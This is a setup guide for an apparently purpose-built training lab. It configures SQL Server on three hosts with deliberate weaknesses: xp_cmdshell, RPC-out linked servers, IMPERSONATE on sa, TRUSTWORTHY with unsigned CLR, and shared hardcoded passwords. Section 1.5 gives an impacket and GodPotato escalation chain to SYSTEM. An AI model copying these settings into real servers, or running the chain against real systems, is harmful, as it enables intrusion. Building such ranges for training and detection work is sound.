# SQL Integration Guide

SQL Server is a **manual install** in CADRE (not automated by the playbooks). After installing and configuring per this guide, the verify playbook `ansible/playbooks/09-sql-wsus-verify.yml` **confirms** settings — it does not create them. Playbooks were updated **after** manual setup to reflect the live lab.

This guide lists exactly what to install and configure on each host so that verification passes.

CADRE uses SQL on **three** hosts:

| Host | Domain | Edition / instance | Role |
|------|--------|--------------------|------|
| **mbr01** | child.cadre.local | SQL Server **Express** — instance `SQLEXPRESS` | Linked-server source (→ mbr02, → linux01), xp_cmdshell |
| **mbr02** | range.local | SQL Server **Developer** — **default** instance | CLR/TRUSTWORTHY surface, linked server → mbr01. Also required by SCCM (see [sccm-integration-guide.md](sccm-integration-guide.md)) |
| **linux01** | cadre.local | **SQL Server on Linux** (`mssql-server`) | Cross-platform MSSQL + Kerberos + audit |

> **SA password (lab-wide):** `s@_P@ssw0rd!L@b!` — the verify playbook and attack scripts assume this. Use it everywhere.

---

## Part 1 — mbr01: SQL Server Express (`SQLEXPRESS`)

RDP/WinRM to **mbr01** as `CHILD\Administrator`.

### 1.1 Install
Download **SQL Server 2022 Express** (`SQL2022-SSEI-Expr.exe`), run it, choose **Basic** (or Custom with instance name `SQLEXPRESS`). Then install **SQLCMD** / the `SqlServer` PowerShell module so `Invoke-Sqlcmd` works.

```powershell
# mixed-mode auth so 'sa' works, set the sa password
# (Custom install: enable SQL+Windows auth, set sa = s@_P@ssw0rd!L@b!)
Install-Module SqlServer -Force        # provides Invoke-Sqlcmd
```

**Enable mixed mode auth** (required for SQL auth from non-domain-joined machines):

```powershell
# Find instance ID
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
# Returns: SQLEXPRESS : MSSQL16.SQLEXPRESS

# Enable mixed mode (LoginMode=2)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQLServer" -Name "LoginMode" -Value 2

# Restart SQL
Restart-Service 'MSSQL$SQLEXPRESS' -Force

# Enable SA login
sqlcmd -S "localhost\SQLEXPRESS" -E -Q "ALTER LOGIN sa ENABLE; ALTER LOGIN sa WITH PASSWORD = 's@_P@ssw0rd!L@b!';"
```

### 1.2 Enable xp_cmdshell  *(WT#41)*
```sql
-- run via: Invoke-Sqlcmd -ServerInstance "localhost\SQLEXPRESS" -Query "..."
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### 1.3 Linked servers → MBR02 and LINUX01, with RPC OUT  *(WT#41, WT#45)*
```sql
EXEC sp_addlinkedserver   @server = 'MBR02';     -- range.local SQL (default instance)
EXEC sp_serveroption      'MBR02', 'rpc out', 'true';
EXEC sp_serveroption      'MBR02', 'rpc', 'true';

EXEC sp_addlinkedserver   @server = 'LINUX01', @srvproduct='', @provider='SQLNCLI', @datasrc='192.168.77.40';
EXEC sp_serveroption      'LINUX01', 'rpc out', 'true';
-- for SQL-auth to linux01 sa:
EXEC sp_addlinkedsrvlogin 'LINUX01', 'false', NULL, 'sa', 's@_P@ssw0rd!L@b!';
```

### 1.4 IMPERSONATE on `sa`  *(WT#43/44)*
Grant a low-priv login the ability to `EXECUTE AS LOGIN='sa'` (the impersonation escalation path). `analyst_t1` is the intended grantee:
```sql
GRANT IMPERSONATE ON LOGIN::sa TO [CHILD\analyst_t1];
```
(The verify check looks for any IMPERSONATE grant where the grantor is `sa` (principal id 1).)

### 1.5 SQL Logins for attack path  *(WT#43/44)*
SQL logins enable the attack chain from non-domain-joined machines (e.g., Kali). Without these, the attacker needs Windows auth (domain-joined machine) to connect.

```sql
-- Create SQL logins
CREATE LOGIN [svc_mssql] WITH PASSWORD = 's3rv1c3_MSSQL!';
CREATE LOGIN [analyst_t1] WITH PASSWORD = 'T13r_An@lyst!';

-- Grant IMPERSONATE on sa to analyst_t1 SQL login
GRANT IMPERSONATE ON LOGIN::sa TO [analyst_t1];
```

**Attack chain from Kali (no domain join needed):**
```bash
# Connect as svc_mssql — discover IMPERSONATE
impacket-mssqlclient 'svc_mssql:s3rv1c3_MSSQL!@192.168.77.22'

# Connect as analyst_t1 — impersonate sa
impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'

# In SQL prompt:
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';           -- nt service\mssql$sqlexpress
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';  -- nt authority\system
```

---

## Part 2 — mbr02: SQL Server Developer (default instance)

RDP to **mbr02** as `RANGE\Administrator`. SQL Developer is installed as part of the **SCCM** prerequisite — see [sccm-integration-guide.md](sccm-integration-guide.md) for the install. The **attack-surface** settings below are CADRE-specific and must be applied after install (run with `sqlcmd -S localhost -E`):

### 2.1 CLR + TRUSTWORTHY + strict security off  *(WT#43)*
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;   -- 2017+ requires this off for unsigned CLR
ALTER DATABASE master SET TRUSTWORTHY ON;
```

### 2.2 Linked server → MBR01, with RPC OUT  *(WT#41)*
```sql
EXEC sp_addlinkedserver @server = 'MBR01', @srvproduct='', @provider='SQLNCLI', @datasrc='mbr01.child.cadre.local\SQLEXPRESS';
EXEC sp_serveroption    'MBR01', 'rpc out', 'true';
```

> WSUS on mbr02 is **auto-deployed** by `04-windows-features.yml` (not manual) — `09` just verifies it.

---

## Part 3 — linux01: SQL Server on Linux

SSH to **linux01** as `vagrant`. (This worked via the archived deploy; the steps below reproduce it on Ubuntu 24.04.)

### 3.1 Install `mssql-server`
```bash
curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo tee /etc/apt/trusted.gpg.d/microsoft.asc
curl -fsSL https://packages.microsoft.com/config/ubuntu/22.04/mssql-server-2022.list | \
  sudo tee /etc/apt/sources.list.d/mssql-server-2022.list      # 22.04 repo works on 24.04
sudo apt-get update && sudo apt-get install -y mssql-server
sudo MSSQL_SA_PASSWORD='s@_P@ssw0rd!L@b!' MSSQL_PID='Developer' /opt/mssql/bin/mssql-conf -n setup accept-eula
sudo systemctl enable --now mssql-server          # WT#45: service running
```
Install tools for verification: `sudo apt-get install -y mssql-tools18 unixodbc-dev python3-pymssql`.

> **Note — Linux audit binary format limitation:** `.sqlaudit` files are UTF-16 LE XML (binary format). Elastic's filestream log integration cannot parse them into structured `mssql.audit.*` fields on Linux (the microsoft_sqlserver integration's audit log stream is Windows-only via `winlog`). Detection for failed logins relies on the errorlog instead (`/var/opt/mssql/log/errorlog`), collected by the `microsoft_sqlserver.log` input. The audit spec is still created because it's a manual install dependency; the errorlog captures login failures (error 18456). Seed rule **L09** (MSSQL failed-login burst) targets `logs-microsoft_sqlserver.log-*` accordingly. (Note: `xp_cmdshell` is **impossible** on SQL Server Linux — `xpstar.dll` is absent — so there is no xp_cmdshell attack or detection on linux01.)

### 3.2 Audit directory + server audit specification  *(WT#45/47)*
```bash
sudo mkdir -p /var/opt/mssql/audit && sudo chown mssql:mssql /var/opt/mssql/audit
```
```sql
-- sqlcmd -S 127.0.0.1 -U sa -P 's@_P@ssw0rd!L@b!' -C
CREATE SERVER AUDIT CADRE_Audit TO FILE (FILEPATH='/var/opt/mssql/audit/');
ALTER SERVER AUDIT CADRE_Audit WITH (STATE = ON);
CREATE SERVER AUDIT SPECIFICATION CADRE_AuditSpec
  FOR SERVER AUDIT CADRE_Audit
  ADD (FAILED_LOGIN_GROUP), ADD (SUCCESSFUL_LOGIN_GROUP),
  ADD (SERVER_PERMISSION_CHANGE_GROUP), ADD (DATABASE_PERMISSION_CHANGE_GROUP)
  WITH (STATE = ON);
```

### 3.3 Kerberos keytab  *(WT#47)*
Generate the SQL SPN keytab **on dc01** and copy it to linux01:
```powershell
# on dc01 (cadre.local) — create the MSSQLSvc SPN keytab for linux01
ktpass -princ MSSQLSvc/linux01.cadre.local:1433@CADRE.LOCAL `
  -mapuser CADRE\svc_mssql -pass <svc_mssql_pw> -crypto AES256-SHA1 -ptype KRB5_NT_PRINCIPAL -out mssql.keytab
```
```bash
# copy to linux01, then:
sudo mkdir -p /var/opt/mssql/secrets
sudo cp mssql.keytab /var/opt/mssql/secrets/mssql.keytab
sudo chown mssql:mssql /var/opt/mssql/secrets/mssql.keytab && sudo chmod 600 /var/opt/mssql/secrets/mssql.keytab
sudo systemctl restart mssql-server
```

---

## Verify

From the provisioning VM:
```bash
ansible-playbook -i inventories/hosts playbooks/09-sql-wsus-verify.yml
```
Checks performed: **mbr01** — xp_cmdshell on, linked servers MBR02 + LINUX01, RPC OUT, IMPERSONATE on sa. **mbr02** — CLR on, TRUSTWORTHY on, CLR-strict off, linked server MBR01 + RPC OUT, WSUS configured. **linux01** — `/var/opt/mssql/audit` exists, `mssql.keytab` present, `mssql-server` active, `CADRE_AuditSpec` exists, errorlog logfile integration active (seed rule L09 detects via errorlog — see §3.2 note).

All must report `PASS` (rc=0). A `FAIL` points to the exact missing step above.
